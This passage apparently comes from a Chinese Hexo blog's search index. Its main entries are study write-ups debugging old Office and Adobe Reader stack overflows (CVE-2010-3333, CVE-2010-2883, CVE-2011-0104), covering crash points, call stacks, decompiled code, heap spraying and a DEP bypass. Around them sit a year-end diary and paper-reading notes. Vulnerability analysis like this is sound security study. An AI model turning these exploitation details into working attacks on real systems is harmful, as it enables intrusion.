0da2b15a3b853ba3ec597d7dc7e3e42688b682803818df05fcb531e96041bb992bde563d0fd8abd6a427a646061b2551cf55140a75b4e0cf49e6cd728e1a873c68b845b97fef23401f85977d3b3ba14d36165f4fd068ece0ed88e3f9f97a51cdd9bfc1bdb07cd3ef8aae93c34070d8db92c76cd48340f728b75da64e9e913057374171a0b68b3d55ebca9dfb704c2079b4adf549ee3f9817740a77443e0d1630c6936e2c560bfba7d5104ea5256edbafbbdf19b54212e01740f2e98239ab5b9920730d109435bda82d2dd2dfa5717c4de2840586308e1abce54e545d5241164d44ea65b7238cb509f44f2816d03ba5187df653bd83c6d76d940cc21357398df1f691979347d067f081fae9e0b59dcaf3e8975a8dbb50dff7fa211c374f4d3e27de76fbd54bd289bef38d980c0b734664af3b5d1908ddf97a4dab817288867850326242144e27dc97f5a4fc699706a5ca05c9266741d6c355939119133c3507a973fa0ff6c3360aa7dcb3080d810923339479cfe2058128abe0754e80ca4fd50bccacb0eb56432588206d4f000f64dd028618db121d3a208b39b429bc12e1e6655b0f20155bd545e71c2e3fb4fab3dd72a7458721109c2a4a4e79fb67e8e9c675a9d205f7c9cac3217f655f4e01712b54874a663d1325e62f1b88e458ef048776e37120416461eae5ec4f67f55b254d4d0ddc6b9c03816e5537832ed54647de2c3cbdcfb6074df50f8fe0738e52d74d4a0831b12f0044ef1e80b50f71746b360b42c958eed873cda4df57f5cca159af404967660702f1fbd5e39d1cf673dfabcf280267b33081c72f8673d7425e4c38b276c4f171c7995ef7b9289fd615d19799d69fc6781f0a0b638dc71e2ee8e0af0176029d5041146046dfe78835aed8d963ba20381332e398cc3b3b2c9b1f033d7a394340f740369750a99a29a5bc3df1225a25222ff577646202899607bfbbcbb0beecfbeef561d26dc61dc40849be65e5d00aa972dfc4da62ecfbefecf0cb3f007949b2f0587e95b7f8aa573a5b25ad22954ef6770ed5509f6896b4dcb1cded4322d693b305d652df3e52289ced635d88951bfefbbc50f2f07eff3e9302f5fb22f46e126650eb3632fdc1b6884b4e53c95dd985a042f760aa920e16ff745a9cd43362d75a5986aba2f677234bbbd102059ab9299c46a240ad049eb5ff4554e691f92568983ef87fa93333a3b635a8d2f323e61970f0f494c65be14b51fa9c5b4558632946c25f930b9e3af090b2f2a442e029ff818b84636df0d9ddef7a1f659fe0386dce1bb7e7b8264f01074a3843c6d4d6b8c12ff3af8d134c4375e4df5278271c71934e698c262f099f15af410ac4cc3170137d4e002a1985c74b2a083fef8632c39f62d1fe444141a2538f09c69143158707b2118fcfb828b5f2f73dc263358806522b2cd4236264ab80c6b49fa949c84430d1989018cf5ea4a9de95f2c5b9930161ae67eec91e0ebe71c07c10f230906a7acae8ee435e5e7d6361b2b11e9bbf3da1e6fcd67cdff8f49746d7429a7c0f53fa3f00fc1b6d9c335352ca36ed4cc48d8520726bbd49be1309f7759a4f58abff9d7c1d5283484382ad9d58142c35a774c996a22cfa84adb9ac161e49e88a5266ed4bc1a17150d45ed3792a251589a91f7ad340210dbe4baee49ea0e486e0ce58f591eb80efd228e06e25249971133370ec76ab2120e8e45fc0e22c0bc2ed0b3b9e1d16281729ca61e01730e499e3e63ee8eb0cc29248b3b761f1b3fdf992239b4aa20ea025449441d11ae6e4c582b0e92cda5e1a4df6a336a0d466aae8406d7109176335cd236d25ce0fa470ee7f16122b3d946a8105d8d9d1eb6eb778b8fd7d9c93a00549b3f4789a7ab86339882daba0467ab0515d13bd0203420cbf32af59947d2d436860173f66243b0480aba433d4f00fde81d2a5e1144f0819a62d2e16f4aee4f7585526ce777f09b06a3a6e460c35590e4e3193216c4292c8d66495d908660f98b0f09f20e8677570600c76acc0233bcb8b0915feaaf8d4eaf59bdc28b7bc31466b4a9</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">爷的QQ号</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>莫名其妙的记录</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2010-3333</title>
    <url>/47243.html</url>
    <content><![CDATA[<p>本来打算只看看书，跳过调试的环节，结果在下一章堆漏洞讲到了分析这个漏洞时用到的栈回溯，所以又回来了2333</p>
<span id="more"></span>
<table>
<thead>
<tr>
<th>项目</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
</tr>
<tr>
<td>调试器</td>
<td>windbg 6.12</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>word 2003 (11.5604.5606)</td>
</tr>
</tbody>
</table>
<p>注：虽然漏洞好像在XP SP3上都有，但是metasploit生成的crash样本在高于11.5604的word上不一定能用（之前调试CVE-2011-0104用的那个office就8行，直接成功把样本打开了…）这个版本找了好久orzz</p>
<h1>漏洞描述</h1>
<p>Stack-based buffer overflow in Microsoft Office XP SP3, Office 2003 SP3, Office 2007 SP2, Office 2010, Office 2004 and 2008 for Mac, Office for Mac 2011, and Open XML File Format Converter for Mac allows remote attackers to execute arbitrary code via crafted RTF data, aka “RTF Stack Buffer Overflow Vulnerability.”</p>
<h1>复现过程</h1>
<p>用metasploit生成poc。<br>
感觉metasploit在windows上不太好使，后来想起来kali自带了这个…</p>
<p>获得poc后打开word，windbg attach，加载poc触发异常一条龙</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512215446.png" alt="20210512215446"><br>
windbg查看寄存器信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这一步需要符号文件，没有配置过的话可以参考下面两个链接</span><br><span class="line">https://bbs.pediy.com/thread-251052.htm</span><br><span class="line">https://www.cnblogs.com/csnd/p/11800535.html</span><br></pre></td></tr></table></figure>
<p>发现edi指向了一个只读的区域<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512215515.png" alt="20210512215515"><br>
所以应该还是在循环复制的时候没有检查长度（似乎好多古老的栈溢出都是因为这个）</p>
<p>在异常处下断点，bp 30e9eb88，重新加载<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512220932.png" alt="20210512220932"><br>
命令k查看栈回溯<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512222342.png" alt="20210512222342"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windbg查看反汇编代码指令：</span><br><span class="line">u .  // 反汇编当前eip寄存器地址的后8条指令</span><br><span class="line"></span><br><span class="line">u $eip  // 反汇编当前eip寄存器地址的后8条指令</span><br><span class="line"></span><br><span class="line">ub .  // 反汇编当前ip寄存器地址的前8条指令</span><br><span class="line"></span><br><span class="line">ub $eip  // 反汇编当前eip寄存器地址的前8条指令</span><br><span class="line"></span><br><span class="line">u main+0x29 L30 // 反汇编main+0x29地址的后30条指令</span><br><span class="line"></span><br><span class="line">u  // 反编译下8条指令</span><br><span class="line"></span><br><span class="line">uf CTest::add  // 反汇编CTest类的add函数</span><br><span class="line"></span><br><span class="line">uf /c main  // 反汇编main函数，通过/c可以查看main函数中的函数调用(call)都有哪些</span><br><span class="line"></span><br><span class="line">ub 000c135d L20  // 查看地址为000c135d指令前的20条指令内容</span><br></pre></td></tr></table></figure>
<p>查看后续的指令和栈中的内容。连着两个pop然后ret，返回到调用漏洞代码的指令的下一指令，即0x30f4cc96<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513182456.png" alt="20210513182456"></p>
<p>在ida里查看，可以发现该指令位于函数sub_30F4CC5D<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513184917.png" alt="20210513184917"><br>
并且函数有三个参数。因为是32位程序，使用栈传递参数，涉及到的三个push指令分别与[ebp+arg_4]（在后续的子函数中赋给edi，如下图2）、ecx、esi有关<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513200611.png" alt="20210513200611"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513210636.png" alt="20210513210636"></p>
<p>先记录一下，这条call指令位于sub_20F4CC5D的30F4CC93，调用了sub_30E9EB62的30E9EB88（即溢出点）<br>
而我们要回溯它用到的三个参数。第一个很直白；2、3需要再分析</p>
<p>先看esi，esi=[eax+64h]，注意到有一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:30F4CC75                 call    sub_30D2810C</span><br></pre></td></tr></table></figure>
<p>进入看到这里是最后修改eax的位置<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513211641.png" alt="20210513211641"></p>
<p>再看ecx，在sub_30E9EB62中：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513212959.png" alt="20210513212959"></p>
<p>在30F4CDB0中可以看到，eax=[ebp+arg_0]</p>
<p>综上得到：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513213522.png" alt="20210513213522"></p>
<p>在windbg中再次调试可以验证静态分析得到的传参过程，没截图，略</p>
<pre><code>整体思路：由崩溃点确定漏洞触发位置——&gt;回溯调用栈——&gt;分析参数如何计算及传递。
</code></pre>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2h4ZnFnOS9iaW4vaHp5eHZr">https://www.yuque.com/hxfqg9/bin/hzyxvk<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjM5OTguaHRt">https://bbs.pediy.com/thread-263998.htm<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Win漏洞分析</tag>
        <tag>漏洞战争</tag>
      </tags>
  </entry>
  <entry>
    <title>2022总结以及2023的flag</title>
    <url>/46412.html</url>
    <content><![CDATA[<blockquote>
<p>我怎么也没想到这个文档居然在12.31凌晨才创建</p>
</blockquote>
<span id="more"></span>
<p>才不会说年报什么的，六月份就开始想写了呢…</p>
<p>不过感觉今年真没啥好写的，就连健忘青年用于回忆的日报满打满算也就二十六则，从三月份<s>预习</s>复习考研的科目开始，好像就没干什么别的事或者学什么有趣的知识，但是要我现在就码出初试上的历程，那我可太不情愿了。</p>
<p>那就有啥写啥吧，下回应该会更丰富</p>
<h1>除了考研</h1>
<p>年初由于封宿舍里单屏幕Coding效率直接趋近0了，索性摆烂不学，囫囵吞枣继续看《论人类不平等的起源和基础》，直到回家后才看完。算是三年来（也许是22年来）看完的第一本哲学书，小小的，却很晦涩。<br>
后来陆续买了几本哲学方面的书，第二本小册子《宗教的本质》也看了近半，不知道啥时候能把剩下几本看完，亦不知道是买书的冲动更强还是看书的速度更快。其实感觉看这种艰深的书对理解考研政治这种同样难懂的科目还是有一些帮助的<br>
二月份参加了HWS硬件安全冬令营，本来是线下的，本社恐都做好思想准备过去了，在和朋友们吃完饭等地铁的时候突然收到线上举行的通知，（于是就这么错过了华子的松山湖和欧洲小镇）。吃了没听数电、没教模电的亏，除了第一天的科普外，后续涉及电路的部分是压根没懂，收获是硬件安全对我来说还是太高深了</p>
<p>开学后为了方便复习加上不好意思腆着脸继续占着学弟学妹的位置，从FZ130搬到了FZ124。在基本不需要在本机跑项目的情况下，为了能不带电脑而是在平板上看/写代码，玩了一两周termux和vim（后来改用aidlux和vscode，这也导致我的vim小记写了五六行就没了…），不过给自己挖的两个坑确实到现在还没填上十分之一；为了能访问电脑上的文件（Yes, I’ve tried 向日葵、frp、反向代理，不过向日葵确实好用），在发现宿舍和教学楼是同一层局域网后，给宿舍的路由器加了个端口映射（能找TUNA都懒得镜像的package也是有点不容易了），这或许算是计网方面的第一个实操？<br>
四月份收到了某论坛的最后一笔钱，眼看那个论坛前端UI日益抽象，群里过节也悄无声息，当时我以为其背后的某公司要支撑不住它了，<s>而我有幸在恰完钱后送一家论坛</s>，刚刚打开看了一眼，嘿，猜怎么着，那个网页现在还挺好看的，<s>而且还上线了积分制，我差点能换几个周边</s>，只可惜看首页似乎没有啥个人在那投文章了…</p>
<p>五月，FZ124由于某些原因终于被回收了，因此也只能去图书馆学习。于是才发现原来宿舍和实验室居然隔了那么远，反正让我再去我肯定是一万个不情愿，其实也有快半年没去过东区了——去图书馆不仅省时间还能经常看到一群好看的小姐姐，多好啊<br>
六月到八月陆续旁听了些线上报告，包括王小云院士的格密码（听了一半就听不懂了）、inforsec的系列讲座（牛博跟着牛导三四年出六七篇A、B类论文的故事，听着再次觉得自己非常…nobody）、…有一回想听个社科方面的，也就是那次才发现原来腾讯会议人数有上线（而我果然没有挤进去）<br>
暑假报了某所的夏令营，充分回顾了从高中到大学的学习经历（23333），大言不惭地进行了套磁<br>
年中的时候蹭出了一篇论文，希望过往做的这些事对最近要做的事情有些帮助<br>
在窜台前一个晚上意外发现摩托罗拉还活着，并且它当天晚上的发布会（没有人在乎摩托罗拉，没有人）<br>
同时，今年很荣幸成为了充过30块小月卡的OP，看着半年多前花了小100买完又因为网络原因而懒得打开的Steep觉得自己非常nt</p>
<p>下半年（大四上）基本就没出过校门了（翻了一下记录，就只在九月和十月初出门吃了三次麦当劳），基本上往返于图书馆和宿舍、食堂。虽然发生过被评价为非常drama和nt的事情，但总归是充实远大于空耗的。<br>
之后的事情就全是备考之类的了。</p>
<h1>其他</h1>
<p>感谢作为高中同桌+工科研友的小鸡每天对我无形的PUA和嘲讽（笑；<br>
感谢珂珂学长在复习上的指点，能让我时不时找他吐槽；<br>
感谢拿下CCS的维哥，跟他近乎不断地相互吐槽了两个半月的日常，见识到了考研后（外）的另一条路线，也混进了大佬云集的某群，令我深深意识到自己变得更菜了（叹<br>
感谢老王帮我挂了几天原神，让我抽到纳西妲（虽然到现在都还没去过须弥）</p>
<p>暑假接受了个电话采访，社恐第一次被采访算是表达全了自己的意思，虽然其受众们的立场在每件事上都可能不太一样，但是采访中倒有不少令我陷入怀疑的问题：你有特别信赖某个媒体吗（为什么）、你是如何判断新闻的真假、你认为新闻的真假（事实）重要吗、…<br>
八月份卸载了知乎，（然后装上了微博，我真的只是为了看徐涛）<br>
今年确实发生了不少事，（网上发声和代发声的人也多了），但somehow大家的分歧更大了，而且即使是列表好友之间的些许观点差异也能上升到另一个层次。因此还是得尽量避免，以免哪天突然发现少了一个关系还行的好友。<br>
年末再回想在上半年开的玩笑：“各大平台可以统计一下在公开IP属地前后各地的用户新增和日活变化情况”，在当下的抽象（意为b站弹幕所指的抽象）环境似乎也不再具备什么意义</p>
<p>祝各位，症状较轻，没有复阳</p>
<h1>2023年的flag</h1>
<p>此时此刻，恰如彼时彼刻（指去年写这个的时候）：无</p>
<p><img src="https://source.unsplash.com/1280x720/?fasttext" alt="FastText Architecture"></p>
]]></content>
      <tags>
        <tag>年度总结</tag>
      </tags>
  </entry>
  <entry>
    <title>BCSD论文阅读</title>
    <url>/65373.html</url>
    <content><![CDATA[<h1>基本块</h1>
<h2 id="Improving-Cross-Platform-Binary-Analysis-using-Representation-Learning-via-Graph-Alignment">Improving Cross-Platform Binary Analysis using Representation Learning via Graph Alignment</h2>
<h2 id="Patch-Based-Vulnerability-Matching-for-Binary-Programs">Patch Based Vulnerability Matching for Binary Programs</h2>
<p>工具名称：BinXray</p>
<p>实验<br>
比较的工具：</p>
<h2 id="Semantics-Based-Obfuscation-Resilient-Binary-Code-Similarity-Comparison-with-Applications-to-Software-and-Algorithm-Plagiarism-Detection">Semantics-Based Obfuscation-Resilient Binary Code Similarity Comparison with Applications to Software and Algorithm Plagiarism Detection</h2>
<h2 id="SIGMADIFF-Semantics-Aware-Deep-Graph-Matching-for-Pseudocode-Diffing">SIGMADIFF: Semantics-Aware Deep Graph Matching for Pseudocode Diffing</h2>
<p>工具名称：Sigmadiff</p>
<p>比较的工具：diaphora（目前已知仅存的伪代码diffing工具）、deepbindiff（仅存的二进制基本块级别diffing）</p>
<p>思想：用IR表示的过程间程序依赖图（IPDG）、DGMC匹配IPDG的结点</p>
<p>IR表示的优点：简洁、更丰富的语义信息、token level的细粒度、跨架构<br>
挑战：在strip的文件里需要推断高级的特征，并可能引入噪声。</p>
<p>流敏感、call-site敏感的lightweight symbolic analysis提取IR语义信息：</p>
<p>motivating：在伪代码里找到语义等价的token级变化，忽略句法的改变。伪码层面的改变带来的挑战（感觉2、3主要还是编译的问题）1.变量重命名（但是在cots文件里应该没有这个问题？）；2.表达式合并或拆分；3.控制流变化。作者在此处进行了实验，表明伪码的diffing不适合直接使用源码diffing技术</p>
<p>Step1：预处理。构造IPDG，结点为IR语句，边（两种）表示控制流和数据流；语义提取，过程内符号执行算法，得到结点的特征，<em>具体算法建议看论文</em><br>
Step2: 伪代码diffing</p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2010-2883 Adobe Reader TFF字体SING表栈溢出漏洞</title>
    <url>/57740.html</url>
    <content><![CDATA[<p>Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING（Smart INdependent Glyphlets）中的uniqueName项时存在栈溢出漏洞。用户打开特制的PDF就可以执行任意恶意代码</p>
<span id="more"></span>
<h2 id="分析环境">分析环境</h2>
<table>
<thead>
<tr>
<th>项目</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>WindowsXP PS3 32位</td>
</tr>
<tr>
<td>调试器</td>
<td>OD 1.10 吾爱汉化版</td>
</tr>
<tr>
<td>反编译器</td>
<td>IDA6.5</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>Adobe Reader 9.3.4</td>
</tr>
</tbody>
</table>
<p>注：根据CVE的描述，漏洞影响的范围包括了Windows和macos上，9.4前的9.x和8.2.5前的8.x</p>
<h2 id="漏洞分析">漏洞分析</h2>
<h3 id="静态分析">静态分析</h3>
<p>IDA反汇编CoolType.dll，易定位漏洞<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414202752.png" alt="20210414202752"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414202821.png" alt="20210414202821"><br>
注意到在pwn题里常见的危险函数strcat，且在调用strcat前并没有对长度进行判断</p>
<h3 id="漏洞样本">漏洞样本</h3>
<p>用二进制查看工具打开书中提供的TTF文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//TFF中SING表的入口结构</span></span><br><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];    <span class="comment">//标记&quot;SING&quot;</span></span><br><span class="line">    ULONG checksum; <span class="comment">//校验和</span></span><br><span class="line">    ULONG offset;   <span class="comment">//相对偏移</span></span><br><span class="line">    ULONG length;   <span class="comment">//数据长度</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414210833.png" alt="20210414210833"><br>
再根据书中提供的SING表结构，找到uniqueName（BYTE[28]）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414211429.png" alt="20210414211429"><br>
即strcat后，这个部分就将复制到指定的区域</p>
<h3 id="动态调试">动态调试</h3>
<hr>
<ul>
<li>注：在调试时遇到了一个问题…Adobe Reader挂上od后打开任何pdf都会发生异常然后结束运行。百度后发现是od调试选项的问题，在选项里加上最后一个“忽略指定异常”应该就可以正常调试<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415212329.png" alt="20210415212329"></li>
</ul>
<p>再：几天后在看雪上也看到了类似的问题和泉哥给出的建议：<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yMTI1NTYuaHRt">https://bbs.pediy.com/thread-212556.htm<i class="fa fa-external-link-alt"></i></span></p>
<hr>
<p>打开OD，加载Adobe Reader，F9，在0x0803DD74和0x0803DDAB处下断点，打开能触发漏洞的pdf</p>
<p>F9运行至push “SING”后再单步运行至最近的call函数，<br>
此时ECX指向SING表的入口地址，进入[0012E4B4]就可以找到SING表<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415214856.png" alt="20210415214856"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415215446.png" alt="20210415215446"><br>
可以看出两个断点间代码的作用是判断SING表入口的有效性，并把uniqueName的地址传给EAX</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：上2图不是同一次运行的截图，所以地址不一样   </span><br></pre></td></tr></table></figure>
<p>F9+F8到strcat的下一行，即发生溢出后，查看此时的栈帧情况（看起来GS至少在WinXP就有了）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415221211.png" alt="20210415221211"><br>
此时返回地址已经被更改成了icucnv36.dll，通过工具可以知道这个库没有开启ASLR</p>
<p>往下运行到0x0808B308，这里是一个进入icucnv36.dll的call指令，跟进去看一看<br>
只有简单的三条指令：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415222508.png" alt="20210415222508"><br>
调整了ebp</p>
<p>运行至0xA82A714<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415223734.png" alt="20210415223734"><br>
而0c0c0c0c处的内容为：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415224754.png" alt="20210415224754"><br>
可以看出是一个堆喷。</p>
<p>后续的操作依次调用了CreateFileA、CreateFileMappingA、MapViewOfFile，开辟出一块可读写可执行的区域绕过DEP(NX)并写入shellcode，随后执行shellcode</p>
<h2 id="流程总结">流程总结</h2>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415225645.png" alt="20210415225645"></p>
<h1>后记</h1>
<p>调试的第一个RW漏洞，感觉比想象中的漏洞复现复杂一些，并不是跟着别人/书里的步骤一步步执行就可以的，还可能遇到一些环境的问题（which整了好久，感谢021w师傅的指导orz）和要琢磨好久的点。<br>
がんばって</p>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTE4MDEuaHRt">https://bbs.pediy.com/thread-251801.htm<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly8wMjF3LmdpdGh1Yi5pby8yMDIwLzA4LzAxL0NWRS0yMDEwLTI4ODMlRTYlQTAlODglRTYlQkMlOEYlRTYlQjQlOUUlRTUlODglODYlRTYlOUUlOTAv">https://021w.github.io/2020/08/01/CVE-2010-2883栈漏洞分析/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Win漏洞分析</tag>
        <tag>漏洞战争</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2011-0104 漏洞分析</title>
    <url>/3418.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>项目</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>WindowsXP SP3</td>
</tr>
<tr>
<td>调试器</td>
<td>windbg 6.12、OD 1.10</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>Office Excel 2003 SP3</td>
</tr>
<tr>
<td>反编译器</td>
<td>IDA 6.1</td>
</tr>
</tbody>
</table>
<p>注：随书文件中的excel在干净的系统中直接打开会显示“操作系统当前的配置不能运行此程序”，需要先安装一个Office</p>
<span id="more"></span>
<h2 id="复现过程">复现过程</h2>
<p>打开Windbg，加载excel，再打开exploit文档</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425182432.png" alt="20210425182432"></p>
<p>此时Windgb会捕捉到发生在excel.exe中异常，ds:eax指向了一个无效的地址。用kb查看一下栈中的数据，可以看到栈内的数据都被覆盖了。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425184839.png" alt="20210425184839"></p>
<p>同时，用ida可以知道异常处所在的函数为sub_300E05AD</p>
<p>用od打开新的excel程序，并在函数入口和异常处下断点，然后加载exploit文件</p>
<p>当程序在函数入口暂停的时候，程序进入了一个新函数，对这个函数的栈顶设置内存写入断点后运行，就可以定位到导致栈溢出的代码</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425191231.png" alt="20210425191231"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：书中写到，exploit是对excel 2007 sp2 写的，因此覆盖到栈顶的是shellcode而不是跳板（所以可以考虑用该版本的excel调试？2333）。嗯 就继续按照书里的来吧</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在ida查看此处的汇编代码，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">.text:300DE825                 lea     esi, dword_3088EC40[edx]</span><br><span class="line">.text:300DE82B                 mov     ecx, eax        ; ecx=eax=复制的字节数</span><br><span class="line">.text:300DE82D                 mov     edx, ecx</span><br><span class="line">.text:300DE82F                 shr     ecx, 2          ; 以dword位单位进行复制，所以/4</span><br><span class="line">.text:300DE832                 mov     edi, ebp</span><br><span class="line">.text:300DE834                 rep movsd               ; 溢出点</span><br></pre></td></tr></table></figure>
<p>接着找到该段代码所属的函数，并用OD在函数起始处下断点，重新运行程序</p>
<p>运行+一点点分析，可以发现这个函数调用了两次（至少），而溢出发生在第二次<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425220650.png" alt="20210425220650"></p>
<p>总共复制了0x300个字节，0x300即“污点”</p>
<p>通过查看调用栈或ida的交叉引用，定位到调用vulfun的函数</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425221948.png" alt="20210425221948"></p>
<p>查看vul_func反汇编代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __userpurge VulFun&lt;eax&gt;(<span class="keyword">void</span> *a1&lt;ebp&gt;, <span class="keyword">void</span> *a2, <span class="keyword">signed</span> <span class="keyword">int</span> a3, <span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx@3</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax@8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// eax@12</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &gt; a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_300DD5A6(dword_3088DF34, <span class="number">6</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = dword_30892C44;</span><br><span class="line">    v6 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">    a1 = a2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt;= v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; <span class="number">16384</span> )</span><br><span class="line">LABEL_15:</span><br><span class="line">          v9 = <span class="number">16384</span>;</span><br><span class="line">        sub_3011A989(v9);</span><br><span class="line">        v5 = dword_30892C44;</span><br><span class="line">        v6 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = v6 - v5;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)v7 )</span><br><span class="line">        v7 = v4;</span><br><span class="line">      <span class="built_in">memcpy</span>(a1, &amp;dword_3088EC40[v5], v7);</span><br><span class="line">      v4 -= v7;</span><br><span class="line">      v5 = v7 + dword_30892C44;</span><br><span class="line">      a1 = (<span class="keyword">char</span> *)a1 + v7;</span><br><span class="line">      dword_30892C44 += v7;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *(_DWORD *)&amp;NumberOfBytesWritten == <span class="number">16384</span> );</span><br><span class="line">    result = a1 - a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到一个memcpy…</p>
<p>再向上看看，发现v7的变化是从这个片段中的子函数来的：</p>
